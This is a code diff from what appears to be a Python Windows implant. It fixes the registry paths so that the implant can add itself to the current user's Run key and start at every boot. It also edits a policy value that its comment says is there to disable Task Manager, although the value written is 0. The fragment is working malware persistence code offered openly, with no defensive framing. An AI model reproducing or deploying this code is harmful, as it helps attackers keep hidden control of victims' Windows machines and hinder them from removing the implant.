@@ -54,13 +54,13 @@ def execute():
 	
 	# Reg key to run implant at boot
 	aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
-	aKey = OpenKey(aReg, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE)
+	aKey = OpenKey(aReg, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_SET_VALUE)
 	SetValueEx(aKey,"foobar",1, REG_SZ, PATH)
 	CloseKey(aKey)
 	
 	# Disable task manager for good measure
 	aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
-	aKey = OpenKey(aReg, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE)
+	aKey = OpenKey(aReg, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, KEY_SET_VALUE)
 	SetValueEx(aKey,"DisableTaskMgr",1, REG_DWORD, 0)
 	CloseKey(aKey)
 
